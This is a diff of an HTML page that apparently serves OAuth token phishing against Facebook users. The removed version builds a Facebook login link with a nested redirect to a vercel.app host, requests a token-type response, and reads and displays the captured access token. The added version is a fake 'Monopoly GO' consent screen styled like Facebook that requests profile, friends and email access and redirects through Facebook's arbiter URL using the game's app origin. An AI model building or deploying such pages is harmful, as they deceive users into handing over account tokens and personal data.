@@ -1,28 +1,58 @@
-<!DOCTYPE html>
-<html>
+  <!DOCTYPE html>
+<html lang="pt-br">
 <head>
-  <title>Login com Facebook</title>
+  <meta charset="UTF-8">
+  <title>Consentimento - Monopoly GO</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .container {
+      background: white;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 400px;
+    }
+    h2 {
+      color: #1c1e21;
+    }
+    p {
+      color: #606770;
+      margin-bottom: 30px;
+    }
+    button {
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #165ec9;
+    }
+  </style>
 </head>
 <body>
-  <h1>Login com Facebook</h1>
-  <a href="https://www.facebook.com/v17.0/dialog/oauth?client_id=1741235030096231&redirect_uri=https://www.facebook.com/v17.0/dialog/oauth?
-client_id=1309702847497831
-&redirect_uri=https://index22-html-six.vercel.app
-&response_type=token
-&scope=email,user_friends
-">
-    <button>Entrar com Facebook</button>
-  </a>
-
-  <h2>Token capturado:</h2>
-  <p id="token"></p>
+  <div class="container">
+    <h2>Permitir acesso ao Monopoly GO?</h2>
+    <p>Este aplicativo solicita acesso ao seu perfil público, lista de amigos e e-mail.</p>
+    <button onclick="confirmConsent()">Confirmar</button>
+  </div>
 
   <script>
-    const hash = window.location.hash;
-    const params = new URLSearchParams(hash.substring(1));
-    const token = params.get("access_token");
-    document.getElementById("token").textContent = token || "Nenhum token encontrado.";
+    function confirmConsent() {
+      const redirectUri = "https://www.facebook.com/dialog/return/arbiter#origin=fbconnect://cct.com.scopely.monopolygs";
+      window.location.href = redirectUri;
+    }
   </script>
 </body>
 </html>
-
